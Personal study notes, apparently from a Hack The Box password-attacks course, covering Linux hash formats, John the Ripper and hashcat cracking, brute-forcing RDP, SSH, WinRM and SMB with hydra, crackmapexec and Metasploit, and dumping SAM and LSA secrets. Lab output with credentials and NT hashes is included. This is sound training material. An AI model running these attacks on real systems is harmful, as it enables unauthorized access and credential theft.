## Credential Storage on Linux
password are also encrypted in `/etc/shadow` <br>
format : `htb-student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::`

| ID       | Cryptography Hash Algorithm |
| -------- | --------------------------- |
| `$1$`    | MD5                         |
| `$2a$`   | Blowfish                    |
| `$5$`    | SHA-256                     |
| `$6$`    | SHA-512                     |
| `$sha1$` | SHA1 crypt                  |
| `$y$`    | Yescrypt                    |
| `$gy$`   | Gost-Yescrypt               |
| `$7$`    | Scrypt                      |

However, a few more files belong to the user management system of Linux. The other two files are `/etc/passwd` and `/etc/group` <br>
>**Note!** : only be read by root. 
## John The Ripper
John The Ripper or JTR or John is a pentesting tool used to check or crack encrypted password (hashed) 
### Crack Mode
```shell
$ john --format="<hash_type>" <hash_file>
```
#### Cracking with John

| **Hash Format**      | **Example Command**                                 | **Description**                                                      |
| -------------------- | --------------------------------------------------- | -------------------------------------------------------------------- |
| afs                  | `john --format=afs hashes_to_crack.txt`             | AFS (Andrew File System) password hashes                             |
| bfegg                | `john --format=bfegg hashes_to_crack.txt`           | bfegg hashes used in Eggdrop IRC bots                                |
| bf                   | `john --format=bf hashes_to_crack.txt`              | Blowfish-based crypt(3) hashes                                       |
| bsdi                 | `john --format=bsdi hashes_to_crack.txt`            | BSDi crypt(3) hashes                                                 |
| crypt(3)             | `john --format=crypt hashes_to_crack.txt`           | Traditional Unix crypt(3) hashes                                     |
| des                  | `john --format=des hashes_to_crack.txt`             | Traditional DES-based crypt(3) hashes                                |
| dmd5                 | `john --format=dmd5 hashes_to_crack.txt`            | DMD5 (Dragonfly BSD MD5) password hashes                             |
| dominosec            | `john --format=dominosec hashes_to_crack.txt`       | IBM Lotus Domino 6/7 password hashes                                 |
| EPiServer SID hashes | `john --format=episerver hashes_to_crack.txt`       | EPiServer SID (Security Identifier) password hashes                  |
| hdaa                 | `john --format=hdaa hashes_to_crack.txt`            | hdaa password hashes used in Openwall GNU/Linux                      |
| hmac-md5             | `john --format=hmac-md5 hashes_to_crack.txt`        | hmac-md5 password hashes                                             |
| hmailserver          | `john --format=hmailserver hashes_to_crack.txt`     | hmailserver password hashes                                          |
| ipb2                 | `john --format=ipb2 hashes_to_crack.txt`            | Invision Power Board 2 password hashes                               |
| krb4                 | `john --format=krb4 hashes_to_crack.txt`            | Kerberos 4 password hashes                                           |
| krb5                 | `john --format=krb5 hashes_to_crack.txt`            | Kerberos 5 password hashes                                           |
| LM                   | `john --format=LM hashes_to_crack.txt`              | LM (Lan Manager) password hashes                                     |
| lotus5               | `john --format=lotus5 hashes_to_crack.txt`          | Lotus Notes/Domino 5 password hashes                                 |
| mscash               | `john --format=mscash hashes_to_crack.txt`          | MS Cache password hashes                                             |
| mscash2              | `john --format=mscash2 hashes_to_crack.txt`         | MS Cache v2 password hashes                                          |
| mschapv2             | `john --format=mschapv2 hashes_to_crack.txt`        | MS CHAP v2 password hashes                                           |
| mskrb5               | `john --format=mskrb5 hashes_to_crack.txt`          | MS Kerberos 5 password hashes                                        |
| mssql05              | `john --format=mssql05 hashes_to_crack.txt`         | MS SQL 2005 password hashes                                          |
| mssql                | `john --format=mssql hashes_to_crack.txt`           | MS SQL password hashes                                               |
| mysql-fast           | `john --format=mysql-fast hashes_to_crack.txt`      | MySQL fast password hashes                                           |
| mysql                | `john --format=mysql hashes_to_crack.txt`           | MySQL password hashes                                                |
| mysql-sha1           | `john --format=mysql-sha1 hashes_to_crack.txt`      | MySQL SHA1 password hashes                                           |
| NETLM                | `john --format=netlm hashes_to_crack.txt`           | NETLM (NT LAN Manager) password hashes                               |
| NETLMv2              | `john --format=netlmv2 hashes_to_crack.txt`         | NETLMv2 (NT LAN Manager version 2) password hashes                   |
| NETNTLM              | `john --format=netntlm hashes_to_crack.txt`         | NETNTLM (NT LAN Manager) password hashes                             |
| NETNTLMv2            | `john --format=netntlmv2 hashes_to_crack.txt`       | NETNTLMv2 (NT LAN Manager version 2) password hashes                 |
| NEThalfLM            | `john --format=nethalflm hashes_to_crack.txt`       | NEThalfLM (NT LAN Manager) password hashes                           |
| md5ns                | `john --format=md5ns hashes_to_crack.txt`           | md5ns (MD5 namespace) password hashes                                |
| nsldap               | `john --format=nsldap hashes_to_crack.txt`          | nsldap (OpenLDAP SHA) password hashes                                |
| ssha                 | `john --format=ssha hashes_to_crack.txt`            | ssha (Salted SHA) password hashes                                    |
| NT                   | `john --format=nt hashes_to_crack.txt`              | NT (Windows NT) password hashes                                      |
| openssha             | `john --format=openssha hashes_to_crack.txt`        | OPENSSH private key password hashes                                  |
| oracle11             | `john --format=oracle11 hashes_to_crack.txt`        | Oracle 11 password hashes                                            |
| oracle               | `john --format=oracle hashes_to_crack.txt`          | Oracle password hashes                                               |
| pdf                  | `john --format=pdf hashes_to_crack.txt`             | PDF (Portable Document Format) password hashes                       |
| phpass-md5           | `john --format=phpass-md5 hashes_to_crack.txt`      | PHPass-MD5 (Portable PHP password hashing framework) password hashes |
| phps                 | `john --format=phps hashes_to_crack.txt`            | PHPS password hashes                                                 |
| pix-md5              | `john --format=pix-md5 hashes_to_crack.txt`         | Cisco PIX MD5 password hashes                                        |
| po                   | `john --format=po hashes_to_crack.txt`              | Po (Sybase SQL Anywhere) password hashes                             |
| rar                  | `john --format=rar hashes_to_crack.txt`             | RAR (WinRAR) password hashes                                         |
| raw-md4              | `john --format=raw-md4 hashes_to_crack.txt`         | Raw MD4 password hashes                                              |
| raw-md5              | `john --format=raw-md5 hashes_to_crack.txt`         | Raw MD5 password hashes                                              |
| raw-md5-unicode      | `john --format=raw-md5-unicode hashes_to_crack.txt` | Raw MD5 Unicode password hashes                                      |
| raw-sha1             | `john --format=raw-sha1 hashes_to_crack.txt`        | Raw SHA1 password hashes                                             |
| raw-sha224           | `john --format=raw-sha224 hashes_to_crack.txt`      | Raw SHA224 password hashes                                           |
| raw-sha256           | `john --format=raw-sha256 hashes_to_crack.txt`      | Raw SHA256 password hashes                                           |
| raw-sha384           | `john --format=raw-sha384 hashes_to_crack.txt`      | Raw SHA384 password hashes                                           |
| raw-sha512           | `john --format=raw-sha512 hashes_to_crack.txt`      | Raw SHA512 password hashes                                           |
| salted-sha           | `john --format=salted-sha hashes_to_crack.txt`      | Salted SHA password hashes                                           |
| sapb                 | `john --format=sapb hashes_to_crack.txt`            | SAP CODVN B (BCODE) password hashes                                  |
| sapg                 | `john --format=sapg hashes_to_crack.txt`            | SAP CODVN G (PASSCODE) password hashes                               |
| sha1-gen             | `john --format=sha1-gen hashes_to_crack.txt`        | Generic SHA1 password hashes                                         |
| skey                 | `john --format=skey hashes_to_crack.txt`            | S/Key (One-time password) hashes                                     |
| ssh                  | `john --format=ssh hashes_to_crack.txt`             | SSH (Secure Shell) password hashes                                   |
| sybasease            | `john --format=sybasease hashes_to_crack.txt`       | Sybase ASE password hashes                                           |
| xsha                 | `john --format=xsha hashes_to_crack.txt`            | xsha (Extended SHA) password hashes                                  |
| <br>zip              | `john --format=zip hashes_to_crack.txt`             | ZIP (WinZip) password hashes                                         |
### Wordlist Mode
**Wordlist mode** is used to crack password using multiple lists of words. it will try one by one to finds the right one.
```shell
$ john --wordlist="<path_of_wordlist>" --rule <hash_file>
```
### Cracking File with John
It can use to crack file which password protect or encrypted
```shell
$ <tool> <file_to_crack> > <file.hash>
$ pdf2john serverdocs.pdf > serverdocs.hash
$ john serverdocs.hash
   #### or #####
$ john --wordlist="rockyou.txt" -serverdocs.hash 
```

|**Tool**|**Description**|
|---|---|
|`pdf2john`|Converts PDF documents for John|
|`ssh2john`|Converts SSH private keys for John|
|`mscash2john`|Converts MS Cash hashes for John|
|`keychain2john`|Converts OS X keychain files for John|
|`rar2john`|Converts RAR archives for John|
|`pfx2john`|Converts PKCS#12 files for John|
|`truecrypt_volume2john`|Converts TrueCrypt volumes for John|
|`keepass2john`|Converts KeePass databases for John|
|`vncpcap2john`|Converts VNC PCAP files for John|
|`putty2john`|Converts PuTTY private keys for John|
|`zip2john`|Converts ZIP archives for John|
|`hccap2john`|Converts WPA/WPA2 handshake captures for John|
|`office2john`|Converts MS Office documents for John|
|`wpa2john`|Converts WPA/WPA2 handshakes for John|
# Remote Password Attacking
## Network Service
n this case, the most common services suitable for this are `RDP`, `WinRM`, and `SSH`.
### WinRM
**WinRM** -> Windows Remote Management<br>
use `crackmapexec` to find username and password
```shell
$ crackmapexec winrm <ip address> -u <user or username_list> -p <password or password_list>
```

```shell
$ evil-winrm -i <ip_address> -u user -p password
```
### RDP
**RDP** -> Remote Desktop Protocol 
use `hydra` to find username and password
```shell
$ hydra -L <username_list> -P <password_list> rdp://<ip_address>
## -t 64 to be faster
```

```shell
$ xfreerdp /v:<target-IP> /u:<username> /p:<password>
```
### SSH
**SSH** -> Secure Shell
use hydra to find username and password
```shell
$ hydra -L <username_list> -P <password_list> ssh://<ip_adress>
```
>**Note!** : if it have ftp port 21 use ftp is faster than ssh
### SMB
**SMB** -> Server Message Block
use hydra to find username and password
```shell
& hydra -L <username_list> -P <password_list> smb://<ip_address>
```
if it error, most likely hydra cannot handle `SMBv3`.<br>
use msfconsole
```shell
$ msf6 > search smb_login
$ msf6 auxiliary(scanner/smb/smb_login) > set rhosts <target_ip>
$ msf6 auxiliary(scanner/smb/smb_login) > set user_file <username_list>
$ msf6 auxiliary(scanner/smb/smb_login) > set pass_file <password_list>
$ msf6 auxiliary(scanner/smb/smb_login) > exploit
```

then use smbclient to login
```shell
$ smbclint -U username -L \\<ip_address>  # list contents
$ smbclint -U username \\\\<ip_address>\\<content> # login smb
```
## Password Mutations
|**Function**|**Description**|
|---|---|
|`:`|Do nothing.|
|`l`|Lowercase all letters.|
|`u`|Uppercase all letters.|
|`c`|Capitalize the first letter and lowercase others.|
|`sXY`|Replace all instances of X with Y.|
|`$!`|Add the exclamation character at the end.|
use `hashcat` to do it
```shell
$ hashcat --force password.list -r custom.rule --stdout > mut_password.list
```
#### Hashcat Existing Rules
```shell
$ ls /usr/share/hashcat/rules/

best64.rule                  specific.rule
combinator.rule              T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
d3ad0ne.rule                 T0XlC-insert_space_and_special_0_F.rule
dive.rule                    T0XlC-insert_top_100_passwords_1_G.rule
generated2.rule              T0XlC.rule
generated.rule               T0XlCv1.rule
hybrid                       toggles1.rule
Incisive-leetspeak.rule      toggles2.rule
InsidePro-HashManager.rule   toggles3.rule
InsidePro-PasswordsPro.rule  toggles4.rule
leetspeak.rule               toggles5.rule
oscommerce.rule              unix-ninja-leetspeak.rule
rockyou-30000.rule
```

# Windows Local Password Attacks
## Attacking With SAM
```shell
┌──(kali㉿kali)-[~/Documents/vpn]
└─$ crackmapexec smb 10.129.202.137 --local-auth -u Bob -p HTB_@cademy_stdnt! --sam
SMB         10.129.202.137  445    FRONTDESK01      [*] Windows 10 / Server 2019 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
SMB         10.129.202.137  445    FRONTDESK01      [+] FRONTDESK01\Bob:HTB_@cademy_stdnt! (Pwn3d!)
SMB         10.129.202.137  445    FRONTDESK01      [+] Dumping SAM hashes
SMB         10.129.202.137  445    FRONTDESK01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
SMB         10.129.202.137  445    FRONTDESK01      ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
[S N I P ...]
```
format : `[UID]:[RID]:[LM hash]:[NT hash]` <br>
use `hashcat` to crack `NT hash` (password) 
```shell
┌──(kali㉿kali)-[~/Downloads]
└─$ hashcat -m 1000 -a 0 sam.hash /usr/share/wordlists/rockyou.txt 
[S N I P . . .]

c02478537b9727d391bc80011c2e2321:matrix                   
# password is matrix
```
### lsa dump
```shell
┌──(kali㉿kali)-[~/Documents/vpn]
└─$ crackmapexec smb 10.129.202.137 --local-auth -u Bob -p HTB_@cademy_stdnt! --lsa
SMB         10.129.202.137  445    FRONTDESK01      frontdesk:Password123
```

## Attacking LSASS
